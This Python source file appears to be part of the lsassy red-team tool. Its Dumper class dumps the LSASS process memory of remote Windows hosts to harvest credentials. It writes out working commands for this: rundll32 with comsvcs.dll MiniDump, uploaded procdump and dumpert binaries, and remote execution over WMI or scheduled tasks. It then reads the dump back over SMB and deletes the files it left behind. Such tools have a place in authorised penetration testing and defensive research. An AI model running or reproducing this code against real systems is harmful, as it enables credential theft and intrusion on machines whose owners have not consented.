# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com [FR]
#  https://en.hackndo.com [EN]

import random
import string

from lsassy.modules.impacketfile import ImpacketFile
from lsassy.exec.taskexe import TASK_EXEC
from lsassy.exec.wmi import WMI
from lsassy.utils.utils import *


class Dumper:

    class Options:
        def __init__(self, tmp_dir="\\Windows\\Temp\\", share="C$", dumpname=None, procdump="procdump.exe", dumpert="dumpert.exe", procdump_path=None, dumpert_path=None, method=1, timeout=10):
            self.tmp_dir = tmp_dir
            self.share = share
            self.dumpname = dumpname
            self.procdump = procdump
            self.dumpert = dumpert
            self.procdump_path = procdump_path
            self.dumpert_path = dumpert_path
            self.method = method
            self.timeout = timeout

    def __init__(self, connection, options=Options()):
        self._log = connection.get_logger()
        self._tmp_dir = options.tmp_dir
        self._share = options.share
        self._procdump = options.procdump
        self._dumpert = options.dumpert
        self._procdump_path = options.procdump_path
        self._dumpert_path = options.dumpert_path
        self._method = options.method
        self._timeout = options.timeout

        if options.dumpname:
            self._remote_lsass_dump = options.dumpname
            if "." not in self._remote_lsass_dump:
                self._remote_lsass_dump += ".dmp"
        else:
            self._remote_lsass_dump = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dmp"

        self._conn = connection
        self._ifile = None

        self._exec_methods = {"wmi": WMI, "task": TASK_EXEC}
        self._use_procdump = False
        self._use_dumpert = False

    def getfile(self):
        if isinstance(self._ifile, ImpacketFile):
            return self._ifile
        return RetCode(ERROR_UNDEFINED, Exception("Trying to return an object which is not an Impacket file"))

    def close(self):
        if isinstance(self._ifile, ImpacketFile):
            self._ifile.close()
            return RetCode(ERROR_SUCCESS)
        return RetCode(ERROR_UNDEFINED, Exception("Trying to close an object which is not an Impacket file"))

    def dump(self):
        """
        Dump lsass on remote host. Different methods can be used.
        If you chose to dump lsass using built-in comsvcs.dll method, you need SeDebugPrivilege. This privilege
        is either in Powershell admin context, or cmd.exe SYSTEM context.
        Two execution methods can be used.
        1. WMIExec with cmd.exe (no SeDebugPrivilege) or powershell.exe (SeDebugPrivilege)
        2. ScheduledTask which is SYSTEM context (SeDebugPrivilege).
        These constraints lead to different possibilities. By default, comsvcs.dll method will be used and will try
        Powershell with WMI, Powershell with scheduled task, and cmd.exe with scheduled task
        """

        """
        A "methodology can be described in an array of 3 elements:
        1. 1st element : Dump method to use (dll, procdump, dumpert)
        2. Shell context to use (powershell, cmd)
        3. List of remote execution methods (wmi, task)
        """
        if self._method == 0:
            dump_methodologies = [
                ["dll", "powershell", ("wmi", "task")],
                ["dll", "cmd", ("task",)],
                ["procdump", "cmd", ("wmi", "task")],
                ["dumpert", "cmd", ("wmi", "task")]
            ]
        elif self._method == 1:
            dump_methodologies = [
                ["dll", "powershell", ("wmi", "task")],
                ["dll", "cmd", ("task",)]
            ]
        elif self._method == 2:
            dump_methodologies = [
                ["procdump", "cmd", ("wmi", "task")]
            ]
        elif self._method == 3:
            dump_methodologies = [
                ["dll", "powershell", ("wmi", "task")]
            ]
        elif self._method == 4:
            dump_methodologies = [
                ["dll", "cmd", ("task",)]
            ]
        elif self._method == 5:
            dump_methodologies = [
                ["dumpert", "cmd", ("wmi", "task")]
            ]
        else:
            self._log.debug("Method \"{}\" is not supported (0-5). See -h for help".format(self._method))
            return RetCode(ERROR_METHOD_NOT_SUPPORTED)

        ifile = ImpacketFile(self._conn, self._log)
        for dump_methodology in dump_methodologies:
            dump_method, exec_shell, exec_methods = dump_methodology
            self._log.debug("Trying \"{}\" method".format(dump_method))
            if dump_method == "dll":
                dumped = self.dll_dump(exec_methods, exec_shell)
            elif dump_method == "procdump":
                dumped = self.procdump_dump(exec_methods)
            elif dump_method == "dumpert":
                dumped = self.dumpert_dump(exec_methods)
            else:
                continue
            if dumped.success():
                """
                If procdump failed, a dumpfile was created, and its content is "FAILED"
                Best guess is that lsass is protected in some way (PPL, AV, ...)
                """
                ret = ifile.open(
                    (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/"),
                    timeout=self._timeout
                )
                if isinstance(ret, ImpacketFile):
                    if ifile.size() == 0 or (ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED"):
                        ifile.close()
                        return RetCode(ERROR_LSASS_PROTECTED)
                    ifile.seek(0)
                    self._ifile = ifile
                    return RetCode(ERROR_SUCCESS)
                else:
                    self._log.warn("No dump file found with \"{}\" using \"{}\" exec method.".format(dump_method, exec_shell))

        """
        If no dump file was found, it means that procdump didn't crash, so it may take more time than expected.
        """
        return RetCode(ERROR_SLOW_TARGET)

    def dll_dump(self, exec_methods=("wmi", "task"), exec_shell="cmd"):
        if exec_shell == "cmd":
            commands = [
                """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
                    self._tmp_dir, self._remote_lsass_dump
                ),
            ]
        elif exec_shell == "powershell":
            commands = [
                'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
                    self._tmp_dir, self._remote_lsass_dump
                ),
            ]
        else:
            return RetCode(ERROR_METHOD_NOT_SUPPORTED)

        self._log.debug("Commands : ")
        for command in commands:
            self._log.debug("{}".format(command))

        for exec_method in exec_methods:
            try:
                self._log.debug("Trying exec method : \"{}\"".format(exec_method))
                self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                self._log.debug("Exec method \"{}\" success !".format(exec_method))
                return RetCode(ERROR_SUCCESS)
            except Exception as e:
                self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                self._log.debug('Error : {}'.format(e))
        return RetCode(ERROR_DLL_NO_EXECUTE)

    def procdump_dump(self, exec_methods=("wmi", "task")):
        """
        Dump lsass with procdump
        :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
        """
        if not self._procdump_path:
            self._log.warn("Procdump path has not been provided")
            return RetCode(ERROR_PROCDUMP_NOT_PROVIDED)
        # Verify procdump exists on host
        if not os.path.exists(self._procdump_path):
            self._log.warn("{} does not exist.".format(self._procdump_path))
            return RetCode(ERROR_PROCDUMP_NOT_FOUND)

        # Upload procdump
        self._log.debug('Copy {} to {}'.format(self._procdump_path, self._tmp_dir))
        with open(self._procdump_path, 'rb') as procdump:
            try:
                self._conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)
            except Exception as e:
                return RetCode(ERROR_PROCDUMP_NOT_UPLOADED)
        self._use_procdump = True

        # Dump lsass using PID
        commands = [
            """cmd.exe /Q /c for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma %J {}{}""".format(
                self._tmp_dir, self._procdump,
                self._tmp_dir, self._remote_lsass_dump
            ),
            "for %A in ({}{}) do IF NOT EXIST %A ( echo FAILED > %A ) ELSE IF %~zA==0 ( echo FAILED > %A )".format(
                self._tmp_dir, self._remote_lsass_dump
            )]

        self._log.debug("Commands : ")
        for command in commands:
            self._log.debug("{}".format(command))

        for exec_method in exec_methods:
            try:
                self._log.debug("Trying exec method : " + exec_method)
                self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                self._log.debug("Exec method \"{}\" success !".format(exec_method))
                return RetCode(ERROR_SUCCESS)
            except Exception as e:
                self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                self._log.debug("Error : {}".format(str(e)))
        return RetCode(ERROR_PROCDUMP_NO_EXECUTE)

    def dumpert_dump(self, exec_methods=("wmi", "task")):
        """
        Dump lsass with dumpert
        :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
        """
        if not self._dumpert_path:
            self._log.warn("dumpert path has not been provided")
            return RetCode(ERROR_DUMPERT_NOT_PROVIDED)
        # Verify dumpert exists on host
        if not os.path.exists(self._dumpert_path):
            self._log.warn("{} does not exist.".format(self._dumpert_path))
            return RetCode(ERROR_DUMPERT_NOT_FOUND)

        # Upload dumpert
        self._log.debug('Copy {} to {}'.format(self._dumpert_path, self._tmp_dir))
        with open(self._dumpert_path, 'rb') as dumpert:
            try:
                self._conn.putFile(self._share, self._tmp_dir + self._dumpert, dumpert.read)
            except Exception as e:
                return RetCode(ERROR_DUMPERT_NOT_UPLOADED)
        self._use_dumpert = True
        self._remote_lsass_dump = "dumpert.dmp"
        # Dump lsass using PID
        commands = [
            """cmd.exe /Q /c {}{}""".format(
                self._tmp_dir, self._dumpert
            ),
            "for %A in ({}{}) do IF NOT EXIST %A ( echo FAILED > %A ) ELSE IF %~zA==0 ( echo FAILED > %A )".format(
                self._tmp_dir, self._remote_lsass_dump
            )]

        for command in commands:
            self._log.debug("{}".format(command))

        for exec_method in exec_methods:
            try:
                self._log.debug("Trying exec method : " + exec_method)
                self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                self._log.debug("Exec method \"{}\" success !".format(exec_method))
                return RetCode(ERROR_SUCCESS)
            except Exception as e:
                self._log.warn("Exec method \"{}\" failed.".format(exec_method))
                self._log.debug("Error : {}".format(str(e)))
        return RetCode(ERROR_DUMPERT_NO_EXECUTE)

    def clean(self):
        try:
            self._ifile.close()
        except Exception as e:
            pass

        try:
            self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)

        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" not in str(e):

                self._log.debug("Dump file \"{}\" wasn't removed. Error : {}".format(
                    self._tmp_dir + self._remote_lsass_dump, str(e)[:100] + "..." if len(str(e)) > 100 else str(e)))
                try:
                    self._log.debug("Trying to reconnect ...")
                    self._conn.clean()
                    self._conn.login()
                    self._log.debug("Reconnected !")
                    self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
                    self._log.debug("Dump file \"{}\" was successfully removed !".format(
                        self._tmp_dir + self._remote_lsass_dump))
                except:
                    self._log.error("Dump file \"{}\" wasn't removed. An error occurred.".format(self._tmp_dir + self._remote_lsass_dump))
                    lsassy_warn(self._log, RetCode(ERROR_DUMP_CLEANING, e))

        if self._use_procdump:
            # Delete procdump.exe
            try:
                self._conn.deleteFile(self._share, self._tmp_dir + self._procdump)
            except Exception as e:
                lsassy_warn(self._log, RetCode(ERROR_PROCDUMP_CLEANING, e))

        if self._use_dumpert:
            # Delete dumpert.exe
            try:
                self._conn.deleteFile(self._share, self._tmp_dir + self._dumpert)
            except Exception as e:
                lsassy_warn(self._log, RetCode(ERROR_DUMPERT_CLEANING, e))

        return RetCode(ERROR_SUCCESS)
